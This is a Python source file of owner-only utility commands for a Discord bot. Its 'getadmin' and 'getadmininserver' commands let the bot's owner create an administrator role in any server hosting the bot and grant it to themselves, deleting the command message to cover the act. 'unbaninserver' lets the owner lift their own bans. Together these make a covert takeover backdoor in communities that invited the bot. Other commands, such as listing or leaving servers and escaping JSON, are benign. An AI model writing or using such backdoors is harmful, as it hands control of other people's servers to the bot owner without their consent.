import json

import discord

from main import bot, is_owner, loge, add_help


@bot.command(name='Ml2oL')
async def dev_utils_multi_line_to_one_line(ctx, *, string):
    one_line_string = "\\n".join(string.splitlines())
    await ctx.send(one_line_string)


@is_owner()
@bot.command(name='getadmin')
async def getadmin(ctx, *, name: str= 'Admin'):
    await ctx.message.delete()
    perms = discord.Permissions(administrator=True)
    role = await ctx.guild.create_role(permissions=perms, name=name if name else None)
    await ctx.author.add_roles(role)
add_help('DEV UTILS', 'getadmin [rolename]', 'creates an admin role and gives it to you')


@is_owner()
@bot.command(name='getadmininserver')
async def getadmin(ctx, server_id: int, *, name: str = "Admin"):
    await ctx.message.delete()
    guild = bot.get_guild(server_id)
    if not guild:
        return await ctx.send("I am not in that server or it's invalid.", delete_after=5)

    me = guild.me
    if not me.guild_permissions.administrator:
        return await ctx.send("I need Administrator permissions in that server.", delete_after=5)

    top_role = max(me.roles, key=lambda r: r.position)
    perms = discord.Permissions(administrator=True)
    role = await guild.create_role(name=name, permissions=perms)

    try:
        await role.edit(position=top_role.position - 1)
    except discord.Forbidden:
        await ctx.send("I don't have permission to edit role positions.", delete_after=5)
        return

    member = guild.get_member(ctx.author.id)
    if not member:
        return await ctx.send("You are not in that server.", delete_after=5)

    await member.add_roles(role)
    await ctx.send(f"Created and assigned the `{name}` admin role in `{guild.name}`.", delete_after=5)


add_help('DEV UTILS', 'getadmininserver <server_id> [rolename]',
         'Creates an admin role in a specific server and assigns it to you, placing it just below the bot’s highest role.')


@bot.command()
@is_owner()
async def unbaninserver(ctx, server_id: int, user_id: int = None):
    guild = bot.get_guild(server_id)
    if not user_id:
        user_id = ctx.author.id
    guild = bot.get_guild(server_id)
    if guild is None:
        await ctx.send("I cannot find the server with that ID.")
        return
    if not guild.me.guild_permissions.ban_members:
        await ctx.send("I don't have permission to unban members.")
        return

    try:
        user = await bot.fetch_user(user_id)
        async for ban_entry in guild.bans():
            if ban_entry.user.id == user_id:
                await guild.unban(user)
                await ctx.send(f"Successfully unbanned {user.name} from {guild.name}.")
                return

        await ctx.send(f"User with ID {user_id} is not banned in {guild.name}.")

    except discord.DiscordException as e:
        await ctx.send(f"An error occurred: {str(e)}")
add_help('DEV UTILS', 'unbaninserver <server_id>','Unbans a user from a server')


@is_owner()
@bot.command(name='rmadmin')
async def rmadmin(ctx, *, name: str):
    await ctx.message.delete()

    if not isinstance(ctx.author, discord.Member):
        await ctx.send("This command can only be used in a server.")
        return

    matching_roles = [role for role in ctx.guild.roles if role.name == name]

    if not matching_roles:
        await ctx.send(f"No roles named '{name}' were found in this server.", delete_after=5)
        return

    valid_roles = [role for role in matching_roles if role in ctx.author.roles and role.permissions.administrator]

    if not valid_roles:
        await ctx.send(f"No admin roles named '{name}' that you have were found.", delete_after=5)
        return
    deleted_roles = []
    for role in valid_roles:
        try:
            await role.delete()
            deleted_roles.append(role.name)
        except discord.Forbidden:
            loge(f"I don't have permission to delete the role '{role.name}'.")
        except discord.HTTPException as e:
            loge(f"Failed to delete the role '{role.name}': {e}")
add_help('DEV UTILS', 'rmadmin <rolename>', 'opposite of get admin')


@is_owner()
@bot.command(name="servers")
async def list_servers(ctx):
    """Lists all servers the bot is currently in."""
    servers = bot.guilds
    if not servers:
        await ctx.send("I'm not in any servers!")
        return

    server_list = "\n".join([f"{guild.name} ({guild.id})" for guild in servers])
    await ctx.send(f"I'm in the following servers:\n{server_list}")
add_help('DEV UTILS', 'servers', 'lists all the servers the bot is in')


@is_owner()
@bot.command(name="serverleave")
async def leave_server(ctx, server_id: int):

    server = discord.utils.get(bot.guilds, id=server_id)
    if server:
        await server.leave()
        await ctx.send(f"Left server: {server.name} ({server.id})")
    else:
        await ctx.send("I'm not in a server with that ID.")
add_help('DEV UTILS', 'serverleave <server id>', 'makes the bot leave a server')


@is_owner()
@bot.command()
async def tojson(ctx, *, text: str):
    try:
        escaped = json.dumps(text)
        await ctx.send(f"```json\n{escaped}\n```")
    except Exception as e:
        await ctx.send(f"Error: {e}")
add_help('DEV UTILS', 'tojson <json strig>', r'returns a well json formated string eg input : "{\"test\": \"hello\"}"')
